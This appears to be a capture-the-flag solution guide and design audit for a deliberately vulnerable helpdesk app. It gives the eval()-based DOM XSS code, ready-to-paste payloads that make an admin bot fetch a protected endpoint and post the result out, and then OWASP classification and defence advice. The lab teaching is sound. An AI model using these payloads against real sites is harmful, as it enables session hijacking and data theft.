# CTF_4 IntraDesk — Solution Guide

## Challenge: DOM XSS in Knowledge Base with Bot-Driven Flag Exfiltration

### Objective

Exploit a DOM-based XSS vulnerability in the Knowledge Base search page to steal your **per-user flag** from an admin-only endpoint. A moderator bot automatically visits reported URLs as an admin, so you must craft a URL that, when visited by the bot, fetches your flag and exfiltrates it to a capture endpoint you can read.

---

### Vulnerability Location

The vulnerability exists in **KnowledgeBase.tsx** in the `headerCallbackRef` callback ref function.

**Vulnerable Code (simplified):**
```tsx
const headerCallbackRef = useCallback((node: HTMLHeadingElement | null) => {
  if (node) {
    const urlParams = new URLSearchParams(window.location.search);
    const rawSearch = urlParams.get('search') || '';

    // ⚠️ Unsafe: directly inserting user input into innerHTML
    node.innerHTML = 'Results for "' + rawSearch + '"';

    // ⚠️ Unsafe: directly executing user-supplied JavaScript
    const callback = urlParams.get('callback');
    if (callback) {
      eval(callback);   // <-- arbitrary JS execution
    }
  }
}, [searchTerm, selectedTag]);
```

There are **two** XSS vectors:
1. **innerHTML injection** via the `search` parameter (HTML context)
2. **eval() injection** via the `callback` parameter (direct JavaScript execution)

The `eval(callback)` path is more reliable and is the intended solution path.

---

### Exploit Chain Overview

```
Player crafts URL with XSS payload
  → Player submits URL via /report page
    → Bot (logged in as admin) visits the URL
      → eval(callback) executes JavaScript in admin's browser session
        → JS fetches /api/admin/flag?reportId=X (admin-only endpoint)
          → API returns the flag of the user who submitted the report
            → JS POSTs the flag to /api/exfil/capture
              → Player reads the captured flag via /captures page
```

---

### Step-by-Step Exploitation

#### Step 1: Discover the `callback` Parameter XSS

Navigate to the Knowledge Base (`/kb`) and try adding a `callback` parameter:

```
http://localhost:5176/kb?search=test&callback=alert(1)
```

You should see an `alert(1)` pop up, confirming arbitrary JavaScript execution via `eval()`.

**Rationale:** The Knowledge Base page reflects the `callback` URL parameter directly into `eval()` without sanitization. This is the intended vulnerability entry point.

---

#### Step 2: Confirm the Bot Visits Reported URLs

Submit a simple report that exfiltrates data to confirm the bot is actually executing your code:

1. Go to **Report** page (`/report`)
2. Submit this URL:
```
http://localhost:5176/kb?search=test&callback=fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:'bot_was_here',reportId:'test'})})
```
3. After a few seconds, go to **My Captures** page (`/captures`)
4. You should see an entry with `data: 'bot_was_here'` — confirming the bot executed your payload

**Rationale:** This validates that the bot is an automated actor with a real browser session. You now know payloads you submit will be executed.

---

#### Step 3: Discover `_reportId` via Report Status

After submitting a report, the **Report** page shows a card for each report with:
- **🤖 Bot visited URL** (highlighted in blue)
- **Status badge** (green when visited)
- **Expandable bot console logs**

**Look at the "Bot visited URL" field** — it will show the exact URL the bot visited, including the `_reportId` query parameter appended by the bot.

Example: `http://localhost:5176/kb?search=test&callback=...&_reportId=7`

**Rationale:** The `_reportId` is automatically appended by the bot when visiting your URL. By viewing the report card, you can see the exact query string the bot used, revealing the `_reportId` value without needing to exfiltrate the URL yourself.

---

#### Step 4: Discover the Admin Flag Endpoint

Try to access the flag endpoint directly from the main app (the Vite dev server proxies all `/api` routes to the backend):

```
http://localhost:5176/api/admin/flag?reportId=1
```

You can also hit it from the browser DevTools console while on the site:
```javascript
fetch('/api/admin/flag?reportId=1').then(r=>r.json()).then(console.log)
```

You'll get a `403 Forbidden` response with a hint:
```json
{
  "error": "Admin access required",
  "hint": "This endpoint requires an active admin session.",
  "usage": "GET /api/admin/flag?reportId=<reportId>",
  "description": "Returns the flag associated with the given report. The flag belongs to the user who submitted the report, not the admin."
}
```

**Rationale:** The 403 response confirms that `/api/admin/flag` exists and expects a `reportId` parameter. The hint reveals that the endpoint returns a flag when accessed with admin privileges — which your bot has.

---

#### Step 5: Discover the Exfiltration Endpoint

Go to **My Captures** page (`/captures`). At the top of the page you'll always see a hint box:

```
Endpoint: POST /api/exfil/capture
Expected JSON body: {"data": ..., "reportId": ...}
No authentication required on this endpoint.
```

**Rationale:** The hint is permanently visible (not just when the list is empty), so players always have the endpoint schema on hand while crafting their payload.

---

#### Step 6: Understand the Flag System

Key facts:
- Each user has a **unique flag** stored in the database
- `GET /api/admin/flag?reportId=X` returns the flag of the **user who submitted report X** (not the admin's flag)
- The bot visits URLs as an **authenticated admin user**, so it can call the admin endpoint
- When the bot visits your URL, it automatically appends `&_reportId=X` so your payload can reference it
- You can view exfiltrated flags at `/captures` (authenticated)

**Rationale:** Understanding this data flow is critical — you must make the bot (which has admin access) fetch the admin endpoint and exfiltrate the flag back to a public endpoint you can read.

---

#### Step 7: Craft the Final Exploit Payload

Now you have all the pieces. The payload must:
1. Read `_reportId` from the URL query string (appended by the bot)
2. Fetch the admin-only `/api/admin/flag?reportId=X` endpoint
3. Wait for the JSON response (which contains your flag)
4. POST the flag to `/api/exfil/capture` endpoint
5. Include the `reportId` so you can retrieve it later

**The payload (readable with comments):**
```javascript
// Construct the admin flag URL with _reportId param
fetch('/api/admin/flag?reportId='.concat(
  new URLSearchParams(location.search).get('_reportId')
))
// Parse the response JSON
.then(function(r) {
  return r.json()
})
// Exfiltrate the flag to the public capture endpoint
.then(function(d) {
  fetch('/api/exfil/capture', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      data: d,
      reportId: new URLSearchParams(location.search).get('_reportId')
    })
  })
})
```

**The payload (one-liner for URL parameter):**
```
fetch('/api/admin/flag?reportId='.concat(new URLSearchParams(location.search).get('_reportId'))).then(function(r){return r.json()}).then(function(d){fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:d,reportId:new URLSearchParams(location.search).get('_reportId')})})})
```

**Key technical detail — Use `.concat()` NOT `+`:**

In URL query strings, `+` is decoded as a **space character** (RFC 1866). This breaks string concatenation:
```
callback=a+b          →  eval("a b")       ← SyntaxError!
callback=a.concat(b)  →  eval("a.concat(b)") ← works!
```

The `.concat()` method is literally in the source code so it survives URL encoding and decoding unchanged.

---

#### Step 8: Construct and Submit the Full URL

**Safe version** (ready to copy-paste into the Report form):
```
http://localhost:5176/kb?search=test&callback=fetch('/api/admin/flag?reportId='.concat(new URLSearchParams(location.search).get('_reportId'))).then(function(r){return r.json()}).then(function(d){fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:d,reportId:new URLSearchParams(location.search).get('_reportId')})})})
```

Steps to submit:
1. **Log in** with your assigned credentials (e.g., `abcd12` / `KHXXSIILQYIF`)
2. Go to **Report** page (`/report`)
3. Paste the full URL above into the **URL field**
4. Click **Submit Report**

**Rationale:** The `/report` endpoint validates that the URL is a KB path, then queues the URL to the BullMQ worker. The bot picks up the job and visits the URL as an authenticated admin.

---

#### Step 9: Wait for Bot Processing and Retrieve Your Flag

1. **Wait 2-5 seconds** for the bot to process your report from the queue
2. Go back to the **Report** page to see the updated report card
3. Check the **bot console logs** (click "Show bot console logs") to debug if anything went wrong
4. Navigate to **My Captures** page (`/captures`)
5. Your flag will appear as a captured entry containing `{"flag": "CTF{user_<username>_<hash>}"}`

**Rationale:** The bot logs in as admin, visits your URL, executes the payload in its admin session, fetches the admin-only flag endpoint (which returns your flag), and POSTs it to the public exfil endpoint. You then read it back as yourself.

---

### Technical Troubleshooting

#### Bot Console Logs Not Showing?

The **Report** page now displays bot console logs in an expandable section. Check these logs if your payload fails silently:

- **`[error]` messages** indicate JavaScript errors in your payload
- **`[log]` messages** are your `console.log()` calls (you can add these to debug)
- **`[warn]` messages** are warnings

**How to add debugging to your payload:**
```javascript
console.log('_reportId:', new URLSearchParams(location.search).get('_reportId'));
// ... rest of payload ...
```

Then check the bot console logs to verify the `_reportId` was found.

#### Flag Not Appearing in Captures?

- **Wait 5+ seconds** — the bot might still be processing
- **Check bot console logs** for errors
- **Verify the `reportId` in the exfil body** matches the actual report ID
- **Check browser console** (Ctrl+Shift+J) for any client-side errors

#### URL Plus Sign Encoding Issue

If your payload has `+` in it (like `a+b`), it will be decoded as a space in `eval()`, causing `SyntaxError`. Use `.concat()` instead:

```javascript
// ❌ Wrong — `+` becomes space after URL decoding
'hello' + 'world'

// ✅ Correct — `.concat()` survives URL encoding
'hello'.concat('world')
```

---

### Challenge Summary

| Aspect | Detail |
|---|---|
| **Vulnerability** | DOM XSS via `eval(callback)` in KnowledgeBase.tsx |
| **Bot Role** | Privileged actor (admin) that visits your reported URL |
| **Privilege Escalation** | Bot's admin session grants access to `/api/admin/flag` |
| **Key Discovery** | `_reportId` appended by bot, visible in Report card |
| **Exfiltration** | Public endpoint `/api/exfil/capture` (no auth required) |
| **Flag Retrieval** | Unique per-user flag accessed via `/captures` page |
| **Scaffolding** | Visited URL, bot console logs, and 403 hints reduce friction |

---

---

### Alternative Payloads

**Simple test (verify XSS works):**
```
http://localhost:5176/kb?search=test&callback=document.title='HACKED'
```

**Alert with cookie (confirms httpOnly is set — cookie will be empty):**
```
http://localhost:5176/kb?search=test&callback=alert(document.cookie)
```

---

### Defense Recommendations

1. **Never use `eval()`** — remove the callback parameter entirely
2. **Use `textContent` instead of `innerHTML`:**
   ```typescript
   node.textContent = `Results for "${rawSearch}"`;
   ```
3. **Sanitize with DOMPurify** if HTML rendering is needed:
   ```typescript
   import DOMPurify from 'dompurify';
   node.innerHTML = DOMPurify.sanitize(headerHTML);
   ```
4. **Implement Content Security Policy (CSP)** headers to block inline script execution
5. **Validate report URLs** server-side to only allow specific paths/patterns

---

### Flag Format

Each user gets a unique flag in the format:
```
CTF{user_<username>_<random_hex>}
```

Example: `CTF{user_abcd12_8bb73ad76fdd80e0}`

The flag is derived per-user, so sharing flags between participants won't work.

---

### OWASP Classification

This challenge covers:
- **A03:2021 — Injection** (DOM XSS via eval and innerHTML)
- **A05:2021 — Security Misconfiguration** (eval enabled, no CSP headers)
- **A07:2021 — Identification and Authentication Failures** (admin bot visits user-supplied URLs)

---

## Post-Design Audit

### Vulnerability Summary

- **Flag (DOM XSS in KB → admin-bot exfiltration of `/api/admin/flag`).** The vulnerability lives in `apps/web/src/pages/KnowledgeBase.tsx`, where a `useCallback` ref handler reads `URLSearchParams` directly into `node.innerHTML` and, more dangerously, into `eval(callback)`. The flag itself is held server-side in `apps/api` and exposed only on `GET /api/admin/flag?reportId=<id>`, gated by an admin session. The exploit chain abuses three components in concert:
  1. **DOM XSS sink** — `eval(callback)` in `KnowledgeBase.tsx` executes any JavaScript supplied via the `callback` query parameter.
  2. **Admin-privileged bot.** `apps/bot/` runs Playwright sessions logged in as an admin, picking jobs off a BullMQ queue. When the player submits a KB URL via `/report`, the bot visits it carrying admin auth cookies, so the `eval`'d payload runs with admin credentials and can hit `/api/admin/flag`.
  3. **Open exfiltration sink.** `POST /api/exfil/capture` is unauthenticated by design — any payload posted there is stored and shown back to the submitter on `/captures`. Together with the bot's append of `_reportId` to the visited URL, the player gets a deterministic round-trip channel.
- The `+`-becomes-space URL decoding quirk forces players to use `String.prototype.concat` rather than `+` for string concatenation in their payload — a real-world quirk that adds intermediate-tier difficulty without changing the underlying exploit class.

### OWASP Top 10 Classification

| Flag | OWASP 2021 | CWE | One-line justification |
|------|-----------|-----|------------------------|
| 1 | A03 — Injection | CWE-79 | DOM-based XSS via `eval()` and `innerHTML` of unfiltered URL parameters in `KnowledgeBase.tsx`. |
| 1 | A05 — Security Misconfiguration | CWE-1004 | No CSP, `eval` allowed, no auth on `/api/exfil/capture`, admin bot configured to visit arbitrary user-supplied URLs. |
| 1 | A07 — Identification & Authentication Failures | CWE-287 | Bot acts as an authenticated admin against URLs whose origin is the user — privilege confusion at the actor boundary. |
| 1 | A01 — Broken Access Control | CWE-639 | `/api/admin/flag` returns the *report submitter's* flag rather than the calling admin's flag, allowing the bot's admin session to expose the player's flag. |

### Defence Recommendations

- **Eliminate `eval` entirely.** Strip the `callback` query handling from `KnowledgeBase.tsx`; there is no production reason for a search results page to execute caller-supplied JavaScript.
- **Use `textContent`, not `innerHTML`,** for the search-result heading. If HTML escaping for highlight markup is required, use a vetted sanitiser (DOMPurify) with a strict allow-list — never the URL parameter directly.
- **Strict CSP.** `script-src 'self'` (no `'unsafe-inline'`, no `'unsafe-eval'`), `frame-ancestors 'none'`. Even if `eval` were retained, CSP would block its execution at runtime.
- **Validate report URLs.** Restrict the allowed URL pattern in `apps/api`'s report submission handler to KB paths with a known schema; reject query strings outside an explicit allow-list. The bot should never visit a URL the API would not have constructed itself.
- **Authenticate the exfiltration endpoint.** `/api/exfil/capture` exists for the player to read back captured data. Move it behind the same session middleware as `/captures` and key entries by the authenticated user, eliminating the "anyone can write, anyone can read" surface.
- **Never expose another user's flag to an admin endpoint.** `/api/admin/flag?reportId` should authorise based on the admin's own resources, not the report submitter's. The current behaviour is the deliberate teaching primitive — the production fix is to return the admin's flag (or 403) regardless of who filed the report.

### Unintended Solutions to Watch For

- **Self-XSS without using the bot.** A player can `eval` their own URL and read their own session, but the flag is on `/api/admin/flag`, which their session cannot access. Path is structurally blocked — confirmed via the e2e harness in `CTFs/e2e/ctf4_exploit.py`.
- **CSRF instead of XSS.** The bot's admin session is cookie-based; a CSRF-shaped attack using `<form>` POSTs would, in theory, hit admin endpoints. In practice, `/api/admin/flag` is GET-only and CORS / SameSite settings block direct cross-site fetches. Players occasionally try this; the test harness rejects (no flag in `/captures`) until they pivot to XSS.
- **Submitting a non-KB URL to `/report`.** Server-side validation rejects URLs whose path does not match the KB pattern, which prevents using arbitrary attacker-controlled origins. Players who try this pattern get a `400` and pivot back. Intended behaviour.
- **Reading the flag straight from `flags.json` on the host.** Out of scope; the e2e test runs against docker-compose and treats flags as opaque.

### Skill Level & Realism Notes

- Target skill level: **intermediate**. Players need to understand DOM XSS sinks, the admin-as-victim model, URL encoding quirks (`+`/space), and a chained exploit with two HTTP endpoints.
- Real-world analogue: very common pattern in helpdesk / ticketing systems where moderators visit user-supplied URLs (Bugzilla 2018 admin XSS, Atlassian Confluence CVE-2022-26134 surface). The "bot visits reported URL as admin" mechanic mirrors the URL preview / link expansion features in Slack / Discord / Jira, which have repeatedly been the entry point for SSRF + admin-confused-deputy chains.

### Lessons Learned (Design Retrospective)

- **The `+` → space decoding bug nearly killed the challenge.** Early versions of the canonical payload used `+` for string concatenation; players reported `eval` errors that looked like the challenge was broken. The shift to `.concat()` in the canonical solution and a documented troubleshooting note resolved this, but it shows how URL-encoding pitfalls can blur the line between "intended difficulty" and "broken challenge".
- **Bot console log surfacing improved completion rates.** Initially the bot ran headlessly with no visible logs; players failing silently could not debug their payload. Exposing the captured `console.log`/`console.error` messages on the Report page gave players the feedback loop they needed without revealing the internal solution.
- **`_reportId` discovery is the lynchpin.** The bot appends `_reportId` to the visited URL; without that, players would have to guess the report id. The Report-page card now surfaces the exact bot URL — preserving discoverability while keeping the technique non-trivial.
- **Workspace-style monorepo (`apps/api`, `apps/web`, `apps/bot`) made the test discipline harder.** A single `npm test` does not exercise the full chain; the integration test for Phase 2 will need to start the bot worker against a real Redis instance to hit the queue path. Plan accordingly.
- **Next time:** add a CSP report-only header so players can observe how a real CSP would have blocked the exploit; this turns the challenge into a teaching artefact for both the offensive and defensive sides.
